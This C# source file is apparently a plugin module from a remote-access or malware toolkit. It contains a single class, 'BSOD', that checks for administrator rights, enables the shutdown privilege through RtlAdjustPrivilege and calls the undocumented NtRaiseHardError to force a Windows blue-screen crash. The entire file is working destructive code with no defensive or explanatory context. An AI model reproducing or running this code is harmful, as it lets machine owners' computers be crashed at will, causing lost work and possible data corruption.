using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Microsoft.VisualBasic.CompilerServices;

namespace Plugin;

public class BSOD
{
	[DllImport("ntdll.dll")]
	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	public static void Run()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			RtlAdjustPrivilege(19, bEnablePrivilege: true, IsThreadPrivilege: false, out var _);
			NtRaiseHardError(Conversions.ToUInteger("&HC0000022"), 0u, 0u, IntPtr.Zero, 6u, out var _);
		}
	}
}
